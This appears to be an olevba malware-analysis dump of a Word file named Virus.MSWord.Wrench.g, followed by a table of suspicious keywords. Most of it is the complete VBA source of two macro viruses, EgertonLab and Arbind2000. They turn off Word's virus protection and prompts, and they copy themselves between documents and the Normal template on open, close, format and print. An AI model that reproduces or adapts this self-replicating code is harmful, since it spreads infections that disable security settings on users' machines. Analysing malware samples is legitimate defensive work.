olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wrench.g-44900a296b1b606336e1d2d905c50b2d41cb3fc1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wrench.g-44900a296b1b606336e1d2d905c50b2d41cb3fc1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EgertonLab.bas 
in file: Virus.MSWord.Wrench.g-44900a296b1b606336e1d2d905c50b2d41cb3fc1 - OLE stream: 'Macros/VBA/EgertonLab'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
 
  Call Infect
End Sub
Sub ViewVBCode()
 With Assistant
    .Animation = msoAnimationGestureDown
    .Visible = True
    .MouseTips = True
    .Help
  End With
   Call Infect
End Sub


Sub Infect()
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
Application.ActiveDocument.AcceptAllRevisions
ModulName = "EgertonLab"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
  Set Carrier = NormalTemplate.VBProject.VBComponents
  Set host = ActiveDocument.VBProject.VBComponents
Else
  Set Carrier = ActiveDocument.VBProject.VBComponents
  Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
  Carrier(ModulName).Export "c:\ascii.vxd"
  host.import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
Sub formatfont()
 Call ViewVBCode
 Call Infect
End Sub

Sub fileprint()
Call ViewVBCode
 Call Infect
End Sub
-------------------------------------------------------------------------------
VBA MACRO Arbind2000.bas 
in file: Virus.MSWord.Wrench.g-44900a296b1b606336e1d2d905c50b2d41cb3fc1 - OLE stream: 'Macros/VBA/Arbind2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 09/18/00 by kales"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.Arbind2000.AutoClose"
'arbind2000
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).codemodule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "arbind2000", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).codemodule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("arbind2000").Export ("c:\arbind2000.tmp")
    ActiveDocument.VBProject.VBComponents.import ("c:\arbind2000.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\arbind2000.tmp")
  End If
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "pepo punda"
    .Text = "bye bye you loser!"
    .Animation = msoAnimationGreeting
    .Show
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

